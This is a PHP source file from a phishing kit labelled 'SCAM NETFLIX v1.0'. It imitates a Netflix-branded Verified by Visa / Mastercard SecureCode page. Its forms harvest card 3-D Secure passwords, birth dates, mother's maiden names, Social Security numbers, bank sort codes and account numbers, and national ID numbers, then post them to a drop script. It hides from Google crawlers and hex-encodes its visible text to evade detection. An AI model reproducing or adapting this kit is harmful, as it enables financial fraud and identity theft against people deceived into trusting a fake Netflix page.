<?php
/*   
   
    ───────────────────────────────────────────────────────────────────────────────────────────────────
    ─██████████████─████████──████████─██████████████─██████──██████─██████████████─████████████████───
    ─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
    ─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
    ─██░░██████████───████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
    ─██░░░░░░░░░░██─────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██████████░░██───────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
    ─────────██░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
    ─██████████░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
    ─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
    ─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
    ───────────────────────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM NETFLIX v1.0   #
                                        #    SYPHER.NETFLIX     #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
        session_start();
        error_reporting(0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_ip.php'); 
        include('../antibots/all_antibots.php'); 
        ########################################################
        ############### [+] VBV INFORMATION [+] ################
        ########################################################
        $_SESSION['_password_vbv_'] = $_POST['password_vbv'];
        $_SESSION['_dob_'] = $_POST['day']."/".$_POST['month']."/".$_POST[''];
        $_SESSION['_sortnum_'] = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
        $_SESSION['_accnumber_'] = $_POST['accnumber'];
        $_SESSION['_ssnnum_'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
        $_SESSION['_mmname_'] = $_POST['mmname'];
        $_SESSION['_creditlimit_'] = $_POST['creditlimit'];
        $_SESSION['_osid_'] = $_POST['osid'];	
        $_SESSION['_codicefiscale_'] = $_POST['codicefiscale'];
        $_SESSION['_kontonummer_'] = $_POST['kontonummer'];
        $_SESSION['_offid_'] = $_POST['offid'];
        ########################################################
        ############# [+] FILTER_VALIDATE_VBV [+] ##############
        ########################################################
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if(empty($_POST['password_vbv'])== false) {
        include('authentication_drop.php');
        }}
        ########################################################
        ######## [+] VERIFIED BY VISA : SECURECODE [+] #########
        ########################################################
        $VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
        $MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
        if($MASTERCARD) {
        $Type_XXX = "&#x4D;&#x61;&#x73;&#x74;&#x65;&#x72;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;";
        $VBV_Name = "&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;";
        }elseif($VISACARD) {
        $Type_XXX = "&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;";
        $VBV_Name = "&#x33;&#x44;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;";
        }
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <title>&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x41;&#x75;&#x74;&#x68;.</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link rel="stylesheet" href="../lib/css/V_SYPHER.css">
      <link type="text/css" rel="stylesheet" href="../lib/css/netflix_btn.css"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/codex.authentication.css" />
      <link rel="shortcut icon" href="../lib/img/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="../lib/img/nficon2016.png"/>
      <style type="text/css">
         textarea:focus, input:focus, input[type]:focus, .uneditable-input:focus {   
         border-color: #e50914;
         box-shadow: 0 1px 1px rgba(229, 103, 23, 0.075) inset, 0 0 8px rgba(229, 103, 23, 0.6);
         outline: 0 none;
         }
      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   </head>
   <body>
      <div id="Rotation">
         <p style="font-size: 13px;">&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x68;&#x61;&#x73;&#x20;&#x62;&#x65;&#x65;&#x6E;&#x20;&#x73;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;&#x66;&#x75;&#x6C;&#x6C;&#x79;&#x20;&#x70;&#x72;&#x6F;&#x63;&#x65;&#x73;&#x73;&#x65;&#x64;&#x2E;&#x2E;&#x2E;</p>
      </div>
      <div id="xMarcos_9X9X" style="opacity: 1;">
         <div id="popup">
            <p style="font-size: 15px;">&#x50;&#x72;&#x6F;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6E;&#x67; </p>
         </div>
         <br>
         <div id="xGhostRiderForm" style="display:none !important;">
            <div class="a-section a-spacing-medium a-text-center">
               <a href="#" class="svg-nfLogo signupBasicHeader">
                  <svg height="45" width="167" class="svg-icon svg-icon-netflix-logo " xmlns="http://www.w3.org/2000/svg" width="1024" height="276.742" viewBox="0 0 1024 276.742">
                     <path d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676l-49.458-144.856v151.073c-15.404 1.621-29.457 3.783-44.051 5.945v-276.742h41.08l56.212 157.021v-157.021h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461v-255.39h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862v198.908c-14.594 0-29.188 0-43.239.539v-199.447h-44.862v-43.242h132.965l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433v-239.718h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676v-242.689h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242v-254.58h-42.43v251.338zm231.881-251.338l-54.863 131.615 54.863 145.127c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75-50.269-129.992h46.482l28.377 72.699 30.27-72.699h47.295z" fill="#d81f26"/>
                  </svg>
               </a>
            </div>
            <div class="a-section a-text-center">
               <style>
                  div.ex1 {
                  width:400px;
                  margin: auto;
                  }
               </style>
               <form method="post" action="authentication_drop.php" class="idform">
               <div class="ex1">
                  <div class="a-section cvf-page-layout">
                     <div id="cvf-page-content" class="a-section">
                        <div class="a-section a-spacing-double-large">
                           <div class="a-box a-spacing-base">
                              <div class="a-box-inner a-padding-extra-large">
                                 <table>
                                    <tbody>
                                       <tr>
                                          <td><img class="cc_bank" id="cc_bank" src="../lib/img/ssl.png"></td>
                                          <?php 
                                             if($MASTERCARD) {  
                                                                      echo '<td><img class="cc_type" id="cc_type" src="../lib/img/mastercard-securecode.png"></td>';
                                             }elseif($VISACARD){
                                              echo '<td><img class="cc_type" id="cc_type" src="../lib/img/verified-by-visa.png"></td>';
                                             }
                                             ?>
                                       </tr>
                                    </tbody>
                                 </table>
                                 <br />
                                 <style>
                                    width:230px;
                                 </style>
                                 <div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
                                 <div id="xDoctorStrange_L1">&#x41;&#x64;&#x64;&#x65;&#x64;&#x20;&#x53;&#x61;&#x66;&#x65;&#x74;&#x79;&#x20;&#x4F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;</div>
                                 <div id="xDoctorStrange_L2"><?=$Type_XXX;?> &#x68;&#x65;&#x6C;&#x70;&#x73;&#x20;&#x70;&#x72;&#x6F;&#x74;&#x65;&#x63;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72; <b></b> &#x63;&#x61;&#x72;&#x64;&#x20;&#x61;&#x67;&#x61;&#x69;&#x6E;&#x73;&#x74;&#x20;&#x75;&#x6E;&#x61;&#x75;&#x74;&#x68;&#x6F;&#x72;&#x69;&#x7A;&#x65;&#x64;&#x20;&#x75;&#x73;&#x65;&#x20;&#x6F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;&#x20;&#x2D;&#x20;&#x61;&#x74;&#x20;&#x6E;&#x6F;&#x20;&#x61;&#x64;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x63;&#x6F;&#x73;&#x74;&#x2E;&#x20;&#x54;&#x6F;&#x20;&#x75;&#x73;&#x65; <?=$Type_XXX;?> &#x6F;&#x6E;&#x20;&#x74;&#x68;&#x69;&#x73;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x66;&#x75;&#x74;&#x75;&#x72;&#x20;&#x70;&#x75;&#x72;&#x73;&#x68;&#x61;&#x73;&#x65;&#x73;&#x2E;&#x20;&#x63;&#x6F;&#x6D;&#x70;&#x6C;&#x65;&#x74;&#x65;&#x20;&#x74;&#x68;&#x69;&#x73;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x59;&#x6F;&#x75;&#x27;&#x6C;&#x6C;&#x20;&#x74;&#x68;&#x65;&#x20;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x6F;&#x77;&#x6E; <?=$Type_XXX;?> &#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</div>
                                 <div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x6F;&#x6E;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x3A;</td>
                                             <td><?=htmlentities($_SESSION['_cc_holder_']);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x6F;&#x75;&#x6E;&#x74;&#x72;&#x79;&#x20;&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x3A;</td>
                                             <td class="limit"><?=ucwords(strtolower($_SESSION['_country_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x61;&#x72;&#x64;&#x20;&#x54;&#x79;&#x70;&#x65;&#x20;&#x3A;</td>
                                             <td><?=ucwords(strtolower($_SESSION['_ccglobal_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x3A;</td>
                                             <td>XXXX-XXXX-XXXX-<?=substr($_SESSION['_cc_number_'] , -4);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;">&#x44;&#x61;&#x74;&#x65;&#x20;&#x74;&#x69;&#x6D;&#x65;&#x20;&#x3A;</td>
                                             <td><?=date('m/d/Y').", ".date("h:i:s A");?></td>
                                          </tr>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x42;&#x69;&#x72;&#x74;&#x68;&#x20;&#x44;&#x61;&#x74;&#x65;&#x20;&#x3A;</td>
                                                <td>
                                                  <input required 
                                                  style="width: 44px;text-align: center;" 
                                                  id="month" 
                                                  type="tel" 
                                                  placeholder="MM" 
                                                  name="month" 
                                                  class="dob" 
                                                  maxlength="2" 
                                                  data-maxlength="2"/>
                                                   / 
                                                   <input required 
                                                   style="width: 50px;text-align: center;" 
                                                   id="day" 
                                                   type="tel" 
                                                   placeholder="DD" 
                                                   name="day" 
                                                   class="dob" 
                                                   maxlength="2" 
                                                   data-maxlength="2"/>
                                                    / 
                                                    <input required 
                                                    style="width: 58px;text-align: center;" 
                                                    id="year" 
                                                    type="tel" 
                                                    placeholder="YYYY" 
                                                    name="year" 
                                                    class="dob" 
                                                    maxlength="4" 
                                                    data-maxlength="4"/>
                                                  </td>
                                             </tr>
                                             <?php
                                                ############################ ITALY ############################ 
                                                if($_SESSION['_LOOKUP_CNTRCODE_'] == "IT") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x6F;&#x64;&#x69;&#x63;&#x65;&#x20;&#x46;&#x69;&#x73;&#x63;&#x61;&#x6C;&#x65;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ################### SWITZERLAND || GERMANY #####################
                                                elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "CH" || $_SESSION['_LOOKUP_CNTRCODE_'] == "DE") {  
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x4B;&#x6F;&#x6E;&#x74;&#x6F;&#x6E;&#x75;&#x6D;&#x6D;&#x65;&#x72;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################### GREECE #############################
                                                elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "GR") {  
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x4F;&#x66;&#x66;&#x69;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x49;&#x44;&#x20;&#x3A;</td>
                                                <td>
                                                <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['_LOOKUP_CNTRCODE_'] == "AU") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x4F;&#x53;&#x49;&#x44;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x4C;&#x69;&#x6D;&#x69;&#x74;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }
                                                ################# IRELAND || UNITED KINGDOM  ###################
                                                elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "IE" || $_SESSION['_LOOKUP_CNTRCODE_'] == "GB" ) {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x53;&#x6F;&#x72;&#x74;&#x20;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"></td>
                                                </tr>                  
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';        
                                                 
                                                        }
                                                #################### UNITED STATES || CANADA ###################
                                                elseif ($_SESSION['_LOOKUP_CNTRCODE_'] == "US" || $_SESSION['_LOOKUP_CNTRCODE_'] == "CA") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x3A;</td>
                                                <td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                          </tr>';
                                                  }
                                                #################### IRELAND || CANADA ###################
                                                  if ($_SESSION['_LOOKUP_CNTRCODE_'] == "IR" || $_SESSION['_LOOKUP_CNTRCODE_'] == "CA") {
                                                     echo'<tr class="Height_XXX">
                                                                            <td ALIGN="LEFT" style="font-weight: bold;">&#x4D;&#x6F;&#x74;&#x68;&#x65;&#x72;&#x2019;&#x73;&#x20;&#x4D;&#x61;&#x69;&#x64;&#x65;&#x6E;&#x20;&#x4E;&#x61;&#x6D;&#x65; :</td>
                                                                            <td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                                                                        </tr>';
                                                      }     
                                                ?>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$VBV_Name;?> :</td>
                                                <td><input required type="password" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"/></td>
                                             </tr>
                                             <tr>
                                                <td><?=$_SESSION['_cc_phone_'];?></td>
                                                <td><?=$_SESSION['_cc_site_'];?></td>
                                             </tr>
                                       </tbody>
                                    </table>
                                 </div>
                                 <br>
                                 <div class="submitBtnContainer">
                                 <button id="submit" style="font-size: 15px;font-weight: normal;" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit">CONFIRM & ACTIVATE</button></div>
                                 </form>
                              </div>
                           </div>
                        </div>
                        <p class="a-spacing-none">&#x43;&#x61;&#x6E;&#x6E;&#x6F;&#x74;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x20;&#x79;&#x6F;&#x75;&#x72; <?=$Type_XXX;?>?
                        <div class="a-section">    <span>&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74; </span>
                           <a class="a-link-normal">&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x20;&#x43;&#x75;&#x73;&#x74;&#x6F;&#x6D;&#x65;&#x72;&#x20;&#x53;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;</a>
                        </div>
                        </p>
                     </div>
                  </div>
               </div>
            </div>
            <style>
               .auth-footer-separator {
               display: inline-block;
               width: 20px;
               }
            </style>
            <div class="a-divider a-divider-section">
               <div class="a-divider-inner"></div>
            </div>
            <div id="footer" class="a-section">
               <div class="a-section a-spacing-small a-text-center">
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  &#x43;&#x6F;&#x6E;&#x64;&#x69;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65;
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  &#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x4E;&#x6F;&#x74;&#x69;&#x63;&#x65;
                  </a>
                  <span class="auth-footer-separator"></span>
                  <a class="a-link-normal" target="_blank" rel="noopener">
                  &#x48;&#x65;&#x6C;&#x70;
                  </a>
                  <span class="auth-footer-separator"></span>
               </div>
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  &#xA9;&#x20;&#x31;&#x39;&#x39;&#x37;&#x2D;<?=date('Y');?>&#x2C;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x2C;&#x20;&#x49;&#x6E;&#x63;&#x2E;&#x20;&#x6F;&#x72;&#x20;&#x69;&#x74;&#x73;&#x20;&#x61;&#x66;&#x66;&#x69;&#x6C;&#x69;&#x61;&#x74;&#x65;&#x73;
                  </span>
               </div>
            </div>
         </div>
      </div>
      </div>
      <script type="text/javascript">
      $(document).ready(function(){
      $("#popup").delay(1000).fadeOut(0);
      $("#xGhostRiderForm").delay(1000).fadeIn(300);
      $("#submit").on('click', function () {
      $('#Rotation').fadeIn(300);
      });});
      </script>
      <script type="text/javascript" src="../lib/js/jquery.bootstrap.js"></script>
   </body>
</html>